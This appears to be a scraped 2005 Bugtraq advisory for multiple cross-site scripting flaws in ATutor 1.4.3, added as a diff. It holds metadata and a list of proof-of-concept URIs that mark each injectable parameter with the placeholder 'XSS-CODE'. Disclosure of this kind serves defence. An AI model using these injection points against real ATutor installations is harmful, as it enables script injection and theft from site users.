@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid13972<p><b><span style="font-size: 18pt;">ATutor Multiple Cross-Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13972/info">info</a><br><a href="http://www.securityfocus.com/bid/13972/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13972/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13972/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13972/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13972
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 16 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Lostmon &lt;lostmon@gmail.com&gt; is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ATutor ATutor 1.4.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept URIs are available:<br/>http://www.example.com/ATutor/browse.php?cat=0&amp;show_course=1XSS-CODE<br/>http://www.example.com/ATutor/contact.php?subject=XSS-CODE<br/>http://www.example.com/atutor/content.php?cid=323XSS-CODE<br/>http://www.example.com/atutor/inbox/send_message.php?l=1XSS-CODE<br/>http://www.example.com/atutor/search.php?search=10XSS-CODE&amp;words=kk&amp;include=all&amp;find_in=this&amp;display_as=pages&amp;search=Search<br/>http://www.example.com/ATutor/search.php?search=1&amp;words=aaXSS-CODE&amp;include=one&amp;find_in=all&amp;display_as=summaries&amp;search=Search#search_results<br/>http://www.example.com/ATutor/search.php?search=1&amp;words=aa&amp;include=oneXSS-CODE&amp;find_in=all&amp;display_as=summaries&amp;search=Search#search_results<br/>http://www.example.com/ATutor/search.php?search=1&amp;words=aa&amp;include=one&amp;find_in=allXSS-CODE&amp;display_as=summaries&amp;search=Search#search_results<br/>http://www.example.com/ATutor/search.php?search=1&amp;words=aa&amp;include=one&amp;find_in=all&amp;display_as=XSS-CODEsummaries&amp;search=Search#search_results<br/>http://www.example.com/ATutor/search.php?search=1&amp;words=aa&amp;include=one&amp;find_in=all&amp;display_as=summaries&amp;search=XSS-CODESearch#search_results<br/>http://www.example.com/ATutor/inbox/index.php?view=1XSS-CODE<br/>http://www.example.com/ATutor/tile.php?query=yy&amp;field=technicalFormat&amp;submit=SearchXSS-CODE<br/>http://www.example.com/ATutor/tile.php?query=XSS-CODE&amp;field=technicalFormat&amp;submit=Search<br/>http://www.example.com/ATutor/tile.php?query=yy&amp;field=technicalFormatXSS-CODE&amp;submit=Search<br/>http://www.example.com/ATutor/forum/subscribe_forum.php?fid=2&amp;us=1XSS-CODE<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=XSS-CODE1&amp;roles%5B%5D=2&amp;roles%5B%5D=3&amp;status=1&amp;submit=Filter<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=1&amp;roles%5B%5D=XSS-CODE2&amp;roles%5B%5D=3&amp;status=1&amp;submit=Filter<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=1&amp;roles%5B%5D=2&amp;roles%5B%5D=3XSS-CODE&amp;status=1&amp;submit=Filter<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=1&amp;roles%5B%5D=2&amp;roles%5B%5D=3&amp;status=1XSS-CODE&amp;submit=Filter<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=1&amp;roles%5B%5D=2&amp;roles%5B%5D=3&amp;status=1&amp;submit=FilterXSS-CODE<br/>http://www.example.com/ATutor/directory.php?roles%5B%5D=1&amp;status=2&amp;reset_filter=Reset+FilterXSS-CODE<br/>http://www.example.com/ATutor/directory.php?roles=1XSS-CODE
+	
+		<ul>
+</ul>
+</div>
